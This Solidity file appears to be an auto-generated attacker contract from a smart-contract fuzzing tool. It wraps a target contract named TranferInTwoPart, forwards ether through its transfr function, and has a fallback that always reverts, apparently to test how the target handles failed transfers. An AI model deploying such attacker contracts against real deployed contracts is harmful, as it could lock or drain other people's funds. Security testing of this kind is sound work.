pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/TranferInTwoPart.sol";

contract Attack_TranferInTwoPart0 {

  TranferInTwoPart public target_contract;

  function Attack_TranferInTwoPart0(address _targetContract) public payable {
      target_contract = TranferInTwoPart(_targetContract);
  } 

  function vultron_transfr(uint256 vultron_amount, address _to) public payable{
    target_contract.transfr.value(vultron_amount)(_to);
  } 

  function() public payable {
    revert();
  }
} 
